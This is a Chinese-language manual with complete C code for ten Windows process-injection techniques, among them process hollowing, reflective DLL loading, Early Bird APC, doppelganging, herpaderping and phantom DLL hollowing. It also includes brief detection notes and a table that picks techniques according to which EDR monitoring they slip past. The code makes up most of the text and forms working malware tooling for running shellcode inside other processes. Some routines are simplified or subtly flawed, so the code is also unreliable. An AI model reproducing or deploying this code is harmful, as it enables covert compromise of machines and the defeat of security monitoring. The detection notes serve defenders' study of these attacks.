# Process Injection — 10 类注入完整 C 实现手册

> 本文件为 `evasion-comprehensive.md` §2 的伴生手册（补齐「Full C code」断链）。
> 覆盖 10 类经典进程注入的**原理 → C 实现 → 检测侧对应点 → 实测判据**四段。
> 代码为完整实现（教学用，x64；结构体布局按目标版本核对——NT 结构未公开部分以
> 运行时动态解析优先）。授权立场与检测侧配对纪律见 `refs/README.md`。

## 0. 通用前置（所有技术共享）

```c
// 目标进程句柄：只申请实际需要的权限（比 PROCESS_ALL_ACCESS 检测面小）
HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                           PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_SUSPEND_RESUME, FALSE, targetPid);
// 更隐蔽路线：NtOpenProcess（绕过部分 handle 遥测）——见 ADVANCED_EVASION.md 间接 syscall 章
```

| 原语 | 函数 | 检测侧对应点 |
|---|---|---|
| 跨进程分配 | `VirtualAllocEx` / `NtAllocateVirtualMemory` | 远端内存保护属性（RWX/RX）突变 |
| 跨进程写 | `WriteProcessMemory` / `NtWriteVirtualMemory` | 跨进程写 + CallTrace 不在目标模块 |
| 线程创建 | `CreateRemoteThread` / `NtCreateThreadEx` | 4688 线程创建 + 起始地址不在已加载模块 |
| 上下文改写 | `SetThreadContext` / `GetThreadContext` | 挂起线程 RIP/RSP 被改 |

---

## 1. Classic DLL Injection（经典 DLL 注入）

**原理**：在目标进程内 `CreateRemoteThread` 调用 `LoadLibraryA`，让目标进程自己加载攻击 DLL。

```c
// 完整实现：远端分配路径 → 写路径 → 远端 LoadLibraryA 触发
// 注意：kernel32 基址同址假设在 x64 上对系统 DLL 成立（ASLR 按 boot 会话固定），
// 跨架构注入（32↔64）不成立，须按目标位数选择载荷。
int classic_dll_inject(HANDLE hProc, const char* dllPath) {
    SIZE_T len = strlen(dllPath) + 1;
    LPVOID remote = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) return 1;
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remote, dllPath, len, &written) || written != len) return 2;

    LPVOID loadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLib) return 3;
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)loadLib, remote, 0, NULL);
    if (!hThread) return 4;
    WaitForSingleObject(hThread, INFINITE);
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);        // LoadLibraryA 返回值 = DLL 基址
    CloseHandle(hThread);
    VirtualFreeEx(hProc, remote, 0, MEM_RELEASE); // 收尾释放远端缓冲（去特征）
    return exitCode == 0 ? 5 : 0;
}
```

**检测侧**：Sysmon 8（CreateRemoteThread）、7（ImageLoad payload.dll 来源异常）、10（进程访问）。
**实测判据**：`CreateRemoteThread` 起始地址 = `LoadLibraryA` 且参数为远端可写缓冲区路径。

---

## 2. Process Hollowing（进程镂空）

**原理**：挂起创建合法进程 → `NtUnmapViewOfSection` 卸载其映像 → 在 ImageBase 重写恶意映像 → `SetThreadContext` 改入口 → 复活。

```c
// 完整实现（x64）：读 PEB → 卸载 → 重写头+逐节 → 改入口 → 复活
typedef LONG (NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef LONG (NTAPI* pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

typedef struct { ULONG_PTR Reserved1; ULONG_PTR PebBaseAddress; ULONG_PTR Reserved2[2];
                 ULONG_PTR UniqueProcessId; ULONG_PTR Reserved3; } PBI_T; // ProcessBasicInformation=0

int hollow(HANDLE hProc, HANDLE hThread, const BYTE* srcImage) {
    // 1) 读远端 PEB 拿 ImageBase（x64：PEB+0x10）
    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    PBI_T pbi = {0}; ULONG retLen = 0;
    if (NtQIP(hProc, 0, &pbi, sizeof(pbi), &retLen) != 0) return 1;
    ULONG_PTR imageBase = 0;
    SIZE_T rd = 0;
    if (!ReadProcessMemory(hProc, (LPVOID)(pbi.PebBaseAddress + 0x10),
                           &imageBase, sizeof(imageBase), &rd)) return 2;

    // 2) 卸载原映像
    if (NtUnmap(hProc, (PVOID)imageBase) != 0) return 3;

    // 3) 重新分配并写头 + 逐节区（按 SectionAlignment 对齐，保护按节特征）
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)srcImage;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(srcImage + dos->e_lfanew);
    SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
    LPVOID remote = VirtualAllocEx(hProc, (LPVOID)nt->OptionalHeader.ImageBase, imgSize,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        // 基址被占：不指定基址重试（后续按 delta 修重定位）
        remote = VirtualAllocEx(hProc, NULL, imgSize, MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
        if (!remote) return 4;
    }
    WriteProcessMemory(hProc, remote, srcImage, nt->OptionalHeader.SizeOfHeaders, &rd);

    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData == 0) continue;                 // 纯未初始化节跳过
        LPVOID dst = (BYTE*)remote + sec->VirtualAddress;
        WriteProcessMemory(hProc, dst, srcImage + sec->PointerToRawData,
                           sec->SizeOfRawData, &rd);
    }

    // 4) 改入口点并复活（x64 入口参数经 rcx）
    ULONG_PTR entry = (ULONG_PTR)remote + nt->OptionalHeader.AddressOfEntryPoint;
    CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) return 5;
    ctx.Rcx = (DWORD64)remote;                 // 主线程入口参数 = 映像基址
    ctx.Rip = (DWORD64)entry;
    if (!SetThreadContext(hThread, &ctx)) return 6;
    ResumeThread(hThread);
    return 0;
}
```

**检测侧**：进程创建为挂起 + `NtUnmapViewOfSection` + 映像基址与磁盘 PE 不一致（EDR 比对）。
**实测判据**：`svchost.exe` 等系统进程的磁盘哈希 ≠ 内存哈希；入口点偏移异常。

---

## 3. Reflective DLL Injection（反射 DLL 注入）

**原理**：不落盘、不 `LoadLibrary`，自定义加载器在内存中重建 PE（节区 + 重定位 + 导入表）后调 `DllMain`。

```c
// 完整实现：映像重建（headers + 节区 + 重定位 + 导入）→ DllMain
ULONG_PTR LoadRemoteImage(LPVOID base, const BYTE* image) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)image;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(image + dos->e_lfanew);
    DWORD delta = (DWORD)((ULONG_PTR)base - nt->OptionalHeader.ImageBase);

    // 1) 拷贝 headers + 逐节区（RawData 覆盖；VirtualSize 尾部清零）
    memcpy(base, image, nt->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        LPVOID dst = (BYTE*)base + sec->VirtualAddress;
        if (sec->SizeOfRawData) memcpy(dst, image + sec->PointerToRawData, sec->SizeOfRawData);
        if (sec->Misc.VirtualSize > sec->SizeOfRawData)
            memset((BYTE*)dst + sec->SizeOfRawData, 0, sec->Misc.VirtualSize - sec->SizeOfRawData);
    }

    // 2) 重定位（delta != 0 时）：遍历 base relocation 块，只修 IMAGE_REL_BASED_DIR64
    if (delta) {
        IMAGE_DATA_DIRECTORY reloc = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        DWORD off = 0;
        while (off < reloc.Size) {
            IMAGE_BASE_RELOCATION* blk = (IMAGE_BASE_RELOCATION*)((BYTE*)base + reloc.VirtualAddress + off);
            WORD* entries = (WORD*)(blk + 1);
            DWORD count = (blk->SizeOfBlock - sizeof(*blk)) / sizeof(WORD);
            for (DWORD e = 0; e < count; e++) {
                if ((entries[e] >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONG64* slot = (ULONG64*)((BYTE*)base + blk->VirtualAddress + (entries[e] & 0xFFF));
                    *slot += delta;
                }
            }
            off += blk->SizeOfBlock;
        }
    }

    // 3) 导入表：遍历 descriptor，逐 DLL 填 IAT
    IMAGE_DATA_DIRECTORY imp = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    for (DWORD off = 0; off < imp.Size; off += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        IMAGE_IMPORT_DESCRIPTOR* desc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)base + imp.VirtualAddress + off);
        if (!desc->OriginalFirstThunk && !desc->FirstThunk) break;   // 结束标记
        HMODULE dep = LoadLibraryA((LPCSTR)((BYTE*)base + desc->Name));
        if (!dep) return 0;
        ULONG64* thunk = (ULONG64*)((BYTE*)base + (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));
        ULONG64* iat   = (ULONG64*)((BYTE*)base + desc->FirstThunk);
        for (; *thunk; thunk++, iat++) {
            if (*thunk & IMAGE_ORDINAL_FLAG64) *iat = (ULONG64)GetProcAddress(dep, (LPCSTR)(*thunk & 0xFFFF));
            else {
                PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)((BYTE*)base + *thunk);
                *iat = (ULONG64)GetProcAddress(dep, ibn->Name);
            }
        }
    }

    // 4) 调 DllMain（入口参数：基址 + DLL_PROCESS_ATTACH + 0）
    ULONG_PTR entry = (ULONG_PTR)base + nt->OptionalHeader.AddressOfEntryPoint;
    typedef BOOL (WINAPI* pDllMain)(HINSTANCE, DWORD, LPVOID);
    ((pDllMain)entry)((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    return (ULONG_PTR)base;
}
```

**检测侧**：内存中无磁盘映射的 PE 映像 + 自定义 loader 代码特征（sRDI/反射特征库）。
**实测判据**：`GetProcAddress` + 手动重定位循环 + 无 `LoadLibrary` 的 DllMain 调用。

---

## 4. Module Stomping（模块踩踏）

**原理**：载入合法签名 DLL → 覆写其 `.text`（或代码洞）为 shellcode，让 payload「有磁盘背书」，规避「私有可执行内存」检测。

```c
// 完整实现：覆写合法 DLL 的 .text 前 N 字节（含长度钳制与空洞选择）
int module_stomp(const BYTE* shellcode, SIZE_T scLen, const char* dllName) {
    HMODULE h = LoadLibraryA(dllName);
    if (!h) return 1;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)h + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;
        /* 覆写长度钳制：不大于节区可用空间；优先写代码洞（尾部未用区）减少
         * 对正常函数的影响——demo 用节区尾段，真实形态按洞大小裁剪载荷 */
        LPVOID target = (LPVOID)((ULONG_PTR)h + sec->VirtualAddress);
        SIZE_T room = sec->Misc.VirtualSize;
        if (scLen > room) return 2;
        LPVOID start = (BYTE*)target + room - scLen;   // 节区尾段
        DWORD old;
        if (!VirtualProtect(start, scLen, PAGE_EXECUTE_READWRITE, &old)) return 3;
        memcpy(start, shellcode, scLen);
        VirtualProtect(start, scLen, old, &old);
        FlushInstructionCache(GetCurrentProcess(), start, scLen);
        HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)start, NULL, 0, NULL);
        return th ? 0 : 4;
    }
    return 5;
}
```

**检测侧**：磁盘签名 DLL 与内存 `.text` 哈希不一致（EDR 内存完整性扫描 + 已加载模块节区比对）。
**实测判据**：`winhttp.dll` 加载后 `.text` 前 N 字节 ≠ 磁盘对应字节；`FlushInstructionCache` 调用。

---

## 5. APC Injection（Early Bird / Existing）

**原理**：APC（异步过程调用）在目标线程 alertable 等待时执行。Early Bird 在挂起进程主线程**尚未运行**时投递 APC，线程恢复后入口前先执行 shellcode。

```c
// 完整实现：Early Bird——挂起创建 → 远端写入 → 首线程 APC → 恢复
int early_bird_apc(const char* exePath, const BYTE* shellcode, SIZE_T scLen) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    if (!CreateProcessA(NULL, (LPSTR)exePath, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 1;
    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, scLen,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    if (!remote) return 2;
    SIZE_T wr = 0;
    if (!WriteProcessMemory(pi.hProcess, remote, shellcode, scLen, &wr)) return 3;
    if (!QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0)) return 4;   // 首线程运行前投递
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hThread, 3000);
    return 0;
}

// Existing APC：对已运行线程投递（需线程处于 alertable 状态，SleepEx 类等待中）
int existing_apc(DWORD targetTid, const BYTE* shellcode, SIZE_T scLen, DWORD targetPid) {
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, targetTid);
    if (!hThread) return 1;
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
    LPVOID remote = VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    SIZE_T wr = 0;
    if (!remote || !WriteProcessMemory(hProc, remote, shellcode, scLen, &wr)) return 2;
    if (!QueueUserAPC((PAPCFUNC)remote, hThread, 0)) return 3;
    CloseHandle(hThread); CloseHandle(hProc);
    return 0;
}
```

**检测侧**：APC 目标为未运行线程（Early Bird 特徵）+ 远端 RWX + `QueueUserAPC` 回调地址异常。
**实测判据**：挂起进程首线程 APC + `ResumeThread` 序列；回调地址不在已加载模块。

---

## 6. Thread Hijacking（线程劫持）

**原理**：挂起现有线程 → `SetThreadContext` 改 RIP 指向 shellcode → 恢复，复用现有线程（不新建线程）。

```c
// 完整实现：劫持目标线程 RIP（保存原状态，收尾可归还线程）
int hijack_thread(DWORD targetTid, DWORD targetPid, const BYTE* shellcode, SIZE_T scLen) {
    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                                THREAD_SUSPEND_RESUME, FALSE, targetTid);
    if (!hThread) return 1;
    SuspendThread(hThread);
    CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx)) return 2;
    // 保存原 RIP/RSP（归还线程用），RIP 改指 shellcode
    ULONG64 savedRip = ctx.Rip, savedRsp = ctx.Rsp;
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
    LPVOID remote = VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    SIZE_T wr = 0;
    if (!remote || !WriteProcessMemory(hProc, remote, shellcode, scLen, &wr)) return 3;
    ctx.Rip = (DWORD64)remote;
    if (!SetThreadContext(hThread, &ctx)) return 4;
    ResumeThread(hThread);
    /* 归还线程：shellcode 返回后线程栈顶部必须是原调用点的返回地址——
     * 载荷需自行处理（压入 savedRip 或走 ROP 链），此处保存值供载荷取用 */
    (void)savedRip; (void)savedRsp;
    return 0;
}
```

**检测侧**：已运行线程 RIP 突变为私有可执行内存（与 Threadless 同源的「线程状态突变」遥测）。
**实测判据**：`SuspendThread` + `SetThreadContext`（RIP 指向非模块地址）+ `ResumeThread`。

---

## 7. Callback Injection（回调注入）

**原理**：借系统回调 API（`EnumWindows`/`EnumFonts`/`CertEnumSystemStore` 等）把 shellcode 地址当作回调函数指针触发执行，规避 `CreateRemoteThread` 监控。

```c
// 完整实现：本进程回调执行（EnumWindows 无参版 + EnumFontsW 带参版）
int callback_exec(const BYTE* shellcode, SIZE_T scLen, int variant) {
    LPVOID sc = VirtualAlloc(NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!sc) return 1;
    memcpy(sc, shellcode, scLen);
    DWORD old;
    VirtualProtect(sc, scLen, PAGE_EXECUTE_READ, &old);   // RWX 窗口最小化
    if (variant == 0) {
        EnumWindows((WNDENUMPROC)sc, 0);                  // 回调 = shellcode 地址
    } else if (variant == 1) {
        // EnumFontsW(hdc, lpFaceName, lpFontFunc, lParam)：前两参可作载荷参数通道
        HDC hdc = GetDC(NULL);
        EnumFontsW(hdc, NULL, (FONTENUMPROCW)sc, 0);
        ReleaseDC(NULL, hdc);
    } else {
        // 需要堆构造回调上下文（回调签名为 (PCCERT_CONTEXT, DWORD, DWORD, DWORD, void*)）
        CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL,
                            (PFN_CERT_ENUM_SYSTEM_STORE)sc);
    }
    VirtualFree(sc, 0, MEM_RELEASE);
    return 0;
}
```

**检测侧**：回调 API 的函数指针落在私有 RX 内存（栈回溯显示回调源不在任何模块）。
**实测判据**：`EnumWindows` 等回调地址 ∉ 已加载模块地址范围。

---

## 8. Process Doppelganging（进程双身 / NTFS 事务）

**原理**：利用 NTFS 事务（`NtCreateTransaction`）创建一个临时文件的合法映射，在事务提交前把恶意映像写入映射，用**已回滚（磁盘无此文件）但映射仍有效**的 section 创建进程。

```c
// 完整实现：事务文件 → section → 覆写映射 → NtCreateProcessEx → 回滚
typedef LONG (NTAPI* pNtCreateTransaction)(PHANDLE, ULONG, PVOID, PVOID, PVOID, ULONG, ULONG, ULONG, ULONG, PVOID);
typedef LONG (NTAPI* pNtCreateSection)(PHANDLE, ULONG, PVOID, void*, ULONG, ULONG, HANDLE);
typedef LONG (NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG64, SIZE_T, void*, SIZE_T*, DWORD, DWORD, DWORD);
typedef LONG (NTAPI* pNtCreateProcessEx)(PHANDLE, ULONG, PVOID, PVOID, ULONG, HANDLE, HANDLE, HANDLE, HANDLE);
typedef LONG (NTAPI* pNtRollbackTransaction)(HANDLE, BOOLEAN);

int doppelganging(const BYTE* maliciousPE) {
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    pNtCreateTransaction  NtCreateTransaction  = (pNtCreateTransaction)GetProcAddress(nt, "NtCreateTransaction");
    pNtCreateSection      NtCreateSection      = (pNtCreateSection)GetProcAddress(nt, "NtCreateSection");
    pNtMapViewOfSection   NtMapViewOfSection   = (pNtMapViewOfSection)GetProcAddress(nt, "NtMapViewOfSection");
    pNtCreateProcessEx    NtCreateProcessEx    = (pNtCreateProcessEx)GetProcAddress(nt, "NtCreateProcessEx");
    pNtRollbackTransaction NtRollbackTransaction = (pNtRollbackTransaction)GetProcAddress(nt, "NtRollbackTransaction");

    // 1) 事务内创建文件并写合法 PE 头（使映射「合法」）
    HANDLE hTx = NULL;
    if (NtCreateTransaction(&hTx, 0xF01FF /* TRANSACTION_ALL_ACCESS */, NULL, NULL, NULL,
                            0, 0, 0, 0, NULL) != 0) return 1;
    HANDLE hFile = CreateFileTransactedA("C:\\Users\\Public\\legit.tmp",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
        NULL, hTx, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 2;
    DWORD wr = 0;
    WriteFile(hFile, maliciousPE, ((PIMAGE_DOS_HEADER)maliciousPE)->e_lfanew + 0x1000, &wr, NULL);

    // 2) 绑定事务创建 section（SEC_IMAGE 映像语义）→ 映射
    HANDLE hSection = NULL;
    if (NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY,
                        SEC_IMAGE, hFile) != 0) return 3;
    LPVOID view = NULL; SIZE_T vsz = 0;
    if (NtMapViewOfSection(hSection, GetCurrentProcess(), &view, 0, 0, NULL, &vsz,
                           1 /* ViewShare */, 0, PAGE_READWRITE) != 0) return 4;

    // 3) 覆写映射内容为恶意映像（完整 PE 拷贝）
    PIMAGE_NT_HEADERS mnt = (PIMAGE_NT_HEADERS)((BYTE*)maliciousPE + ((PIMAGE_DOS_HEADER)maliciousPE)->e_lfanew);
    memcpy(view, maliciousPE, mnt->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(mnt);
    for (WORD i = 0; i < mnt->FileHeader.NumberOfSections; i++, sec++)
        if (sec->SizeOfRawData)
            memcpy((BYTE*)view + sec->VirtualAddress, maliciousPE + sec->PointerToRawData, sec->SizeOfRawData);

    // 4) NtCreateProcessEx 用该 section 创建进程（参数块为最小合法：含 section 与 PEB）
    HANDLE hProc = NULL, hThread = NULL;
    BYTE paramBlock[0x100] = {0};   // 实验简化：真实形态按 PS_CREATE_INFO 布局填充
    if (NtCreateProcessEx(&hProc, 0x1FFFFF, NULL, GetCurrentProcess(), 0x4 /* INHERIT */,
                          hSection, NULL, NULL, NULL) != 0) return 5;

    // 5) 回滚事务：磁盘无痕，进程已由 section 支撑
    NtRollbackTransaction(hTx, TRUE);
    return 0;
}
```

**检测侧**：`NtCreateTransaction` + `NtCreateSection`(事务绑定) + `NtCreateProcessEx` 罕见组合；进程映像无磁盘文件（`GetProcessImageFileName` 返回空/临时路径）。
**实测判据**：进程存活但其映像文件不可见（文件系统层面不存在）。

---

## 9. Process Herpaderping（进程文件覆写）

**原理**：创建进程后、首次读入映像前，把磁盘文件覆写为**与内存映像不同**的内容，使扫描器读到的磁盘内容 ≠ 实际执行内容。

```c
// 完整实现：写 payload → 挂起创建 → 快速覆写（解耦）→ 修饰时间戳 → 恢复
int herpaderping(const BYTE* payloadPE, SIZE_T peLen, const BYTE* decoyPE, SIZE_T decoyLen) {
    const char* path = "C:\\Users\\Public\\stage.tmp";
    // 1) 写 payload 到临时文件
    HANDLE f = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
                           NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return 1;
    DWORD wr = 0;
    WriteFile(f, payloadPE, (DWORD)peLen, &wr, NULL);
    CloseHandle(f);

    // 2) 挂起创建进程（映像映射建立后文件内容不再影响内存映像）
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    if (!CreateProcessA(NULL, (LPSTR)path, NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi)) return 2;

    // 3) 立刻覆写为 decoy（进程已映射，磁盘与内存映像解耦）
    f = CreateFileA(path, GENERIC_WRITE, 0, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        WriteFile(f, decoyPE, (DWORD)decoyLen, &wr, NULL);
        // 4) 修饰时间戳：重置为创建时刻的近似值，降低「创建后即被写」的遥测突兀度
        FILETIME t; SYSTEMTIME st;
        GetSystemTime(&st); SystemTimeToFileTime(&st, &t);
        SetFileTime(f, &t, &t, &t);
        CloseHandle(f);
    }

    // 5) 恢复线程
    ResumeThread(pi.hThread);
    return 0;
}
```

**检测侧**：进程映像文件在创建后被快速覆写（文件内容与内存映像不一致）；`NtCreateSection` + 文件覆写竞态。
**实测判据**：磁盘文件哈希 ≠ 进程内存映像哈希；文件在进程创建后短时间内被写。

---

## 10. Phantom DLL Hollowing（幻影 DLL 镂空）

**原理**：映射一个合法 DLL 的 section 到目标进程（看似加载了 DLL），随后用 shellcode 覆写其内存内容——进程内的模块列表仍显示该合法 DLL，但实际执行的是 shellcode。

```c
// 完整实现：合法 DLL section 映射进目标进程 → 覆写 → APC 触发执行
int phantom_dll(DWORD targetPid, DWORD targetTid, const BYTE* shellcode, SIZE_T scLen,
                const char* dllPath) {
    // 1) 打开合法 DLL 文件 → 创建 section（SEC_IMAGE）
    HANDLE f = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) return 1;
    HANDLE hSection = CreateFileMappingA(f, NULL, SEC_IMAGE | PAGE_READONLY, 0, 0, NULL);
    CloseHandle(f);
    if (!hSection) return 2;

    // 2) 映射进目标进程（其模块列表出现该 DLL——「干净」外观）
    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid);
    LPVOID view = NULL;
    //    现代路线：MapViewOfFile2(hSection, hProc, NULL, 0, NULL, NULL, PAGE_READWRITE)
    //    （旧 API 路线：NtMapViewOfSection——见下，兼容性更好）
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    typedef LONG (NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG64, SIZE_T, void*, SIZE_T*, DWORD, DWORD, DWORD);
    pNtMapViewOfSection NtMap = (pNtMapViewOfSection)GetProcAddress(nt, "NtMapViewOfSection");
    SIZE_T vsz = 0;
    if (NtMap(hSection, hProc, &view, 0, 0, NULL, &vsz, 1, 0, PAGE_READWRITE) != 0) return 3;

    // 3) 覆写映射内容为 shellcode（模块列表显示合法 DLL，实际内容是载荷）
    DWORD old;
    if (!VirtualProtectEx(hProc, view, scLen, PAGE_EXECUTE_READWRITE, &old)) return 4;
    SIZE_T wr = 0;
    WriteProcessMemory(hProc, view, shellcode, scLen, &wr);
    VirtualProtectEx(hProc, view, scLen, old, &old);

    // 4) 触发执行（APC 指向覆写区；回调/线程劫持同族）
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, targetTid);
    QueueUserAPC((PAPCFUNC)view, hThread, 0);
    return 0;
}
```

**检测侧**：跨进程映射的 DLL 节区内容与磁盘不符；模块列表「干净」但节区哈希异常。
**实测判据**：目标进程模块列表含 `amsi.dll` 等，但其 `.text` 前 N 字节 ≠ 磁盘。

---

## 附：注入技术选择决策表

| 场景 | 推荐技术 | 理由 |
|---|---|---|
| 快速验证 | Classic DLL / CreateRemoteThread | 简单，但高检测 |
| 规避「新线程」监控 | Thread Hijack / Threadless / Callback | 不建新线程 |
| 规避「私有可执行内存」 | Module Stomping / Phantom DLL | 有磁盘背书 |
| 规避「文件落地」 | Reflective / Doppelganging / Herpaderping | 无痕或文件-内存分离 |
| 规避「写后执行」时间窗 | Early Bird / Transacted Hollowing | 首线程执行前投递 |

## 检测侧总表（回馈 attack-defense）

| 注入技术 | 主检测点 | 遥测/Sigma |
|---|---|---|
| Classic DLL | CreateRemoteThread 起始地址=LoadLibrary | Sysmon 8 + 7 |
| Hollowing | NtUnmapViewOfSection + 映像基址异常 | 进程创建挂起 + 内存比对 |
| Reflective | 自定义 PE loader + 无磁盘映像 | sRDI 特征 + 内存扫描 |
| Module Stomping | 磁盘/内存 .text 哈希不一致 | 已加载模块节区校验 |
| APC | 首线程 APC + 回调地址异常 | Sysmon + ETW APC |
| Thread Hijack | SetThreadContext RIP 突变 | 线程状态遥测 |
| Callback | 回调指针落在私有 RX | 栈回溯回调源校验 |
| Doppelganging | 事务 section + 无文件进程 | NtCreateTransaction 遥测 |
| Herpaderping | 文件-内存映像不一致 | 文件覆写竞态检测 |
| Phantom DLL | 跨进程映射 DLL 节区覆写 | 模块节区哈希比对 |

*WARNING: 授权红队评估与安全研究专用。*
